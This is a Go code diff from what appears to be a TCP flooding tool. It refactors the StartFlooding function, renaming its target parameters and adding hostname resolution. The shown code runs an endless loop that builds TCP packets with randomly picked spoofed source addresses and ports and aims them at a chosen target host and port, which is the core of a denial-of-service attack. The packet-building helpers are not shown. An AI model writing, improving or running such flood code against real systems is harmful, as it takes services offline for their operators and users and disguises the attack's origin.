@@ -17,7 +17,7 @@ func init() {
 }
 
 // StartFlooding does the heavy lifting, starts the flood
-func StartFlooding(dstIpStr string, dstPort, payloadLength int, floodType string) error {
+func StartFlooding(destinationHost string, destinationPort, payloadLength int, floodType string) error {
 	var (
 		ipHeader   *ipv4.Header
 		packetConn net.PacketConn
@@ -25,8 +25,10 @@ func StartFlooding(dstIpStr string, dstPort, payloadLength int, floodType string
 		err        error
 	)
 
+	destinationHost = resolveHost(destinationHost)
+
 	description := fmt.Sprintf("Flood is in progress, target=%s:%d, floodType=%s, payloadLength=%d",
-		dstIpStr, dstPort, floodType, payloadLength)
+		destinationHost, destinationPort, floodType, payloadLength)
 	bar := progressbar.DefaultBytes(-1, description)
 
 	payload := getRandomPayload(payloadLength)
@@ -35,8 +37,8 @@ func StartFlooding(dstIpStr string, dstPort, payloadLength int, floodType string
 	macAddrs := getMacAddrs()
 
 	for {
-		tcpPacket := buildTcpPacket(srcPorts[rand.Intn(len(srcPorts))], dstPort, floodType)
-		ipPacket := buildIpPacket(srcIps[rand.Intn(len(srcIps))], dstIpStr)
+		tcpPacket := buildTcpPacket(srcPorts[rand.Intn(len(srcPorts))], destinationPort, floodType)
+		ipPacket := buildIpPacket(srcIps[rand.Intn(len(srcIps))], destinationHost)
 		if err = tcpPacket.SetNetworkLayerForChecksum(ipPacket); err != nil {
 			return err
 		}
